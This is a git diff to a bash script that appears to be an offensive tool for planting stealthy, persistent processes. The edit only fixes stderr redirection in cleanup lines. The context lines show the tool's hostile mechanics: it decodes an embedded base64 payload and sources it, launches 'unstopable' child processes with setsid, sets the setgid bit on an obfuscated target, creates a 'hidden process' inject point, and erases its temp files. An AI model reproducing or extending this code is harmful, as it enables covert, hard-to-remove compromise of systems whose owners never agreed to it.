@@ -76,7 +76,7 @@ echo " | "
 echo " | "
 echo " |_ "
 echo -e $okegreen"    +$RESET Clean old config in temporary folder "
-rm $conf >> /dev/null 2&>1 ; rm tmp/* >> /dev/null 2&>1
+rm $conf >> /dev/null 2>&1 ; rm tmp/* >> /dev/null 2>&1
 echo
 sleep 2
 echo -e $okegreen"    +$RESET Create a file config "
@@ -230,7 +230,7 @@ echo " | "
 echo " |_ "
 echo -e $okegreen "    +"$RESET" Clean  old config in temporary folder "
 sleep 1;echo
-rm tmp/TmpFuncHollyShit > /dev/null 2&>1;rm $conf >> /dev/null 2&>1;rm tmp/*.c >> /dev/null 2&>1
+rm tmp/TmpFuncHollyShit > /dev/null 2>&1;rm $conf >> /dev/null 2>&1;rm tmp/*.c >> /dev/null 2>&1
 inject_point_enc_0 | base64 -d > tmp/TmpFuncHollyShit
 source tmp/TmpFuncHollyShit
 echo -e $okegreen "    +"$RESET" Execute Child Process with infinity sessions ( unstopable ) "
@@ -259,7 +259,7 @@ chmod 2755 $JumAPmNNIAUBnX
 setsid sh -c "$JumAPmNNIAUBnX" & > /dev/tty2 >&0 2>&1
 	echo -ne $okegreen " Create Inject Point Succes , "$RESET"Press any key to exit \n\n"
 	read anjenglo
-	rm tmp/* >> /dev/null 2&>1
+	rm tmp/* >> /dev/null 2>&1
   	exit 1
  	 elif [ ! -f "$babe"  ]
 			then
@@ -278,7 +278,7 @@ babe=$2
   	resize -s 35 98 > /dev/null;banner;echo -ne " Create Inject Point for create hidden rocess \n\n"
 	inject_hidden_pon
 	echo -ne $okegreen " Create Inject Point Succes , "$RESET"Press any key to exit \n\n"
-	rm tmp/* >> /dev/null 2&>1
+	rm tmp/* >> /dev/null 2>&1
 	read anjenglo
   exit 1
   elif [ ! -f "$babe"  ]
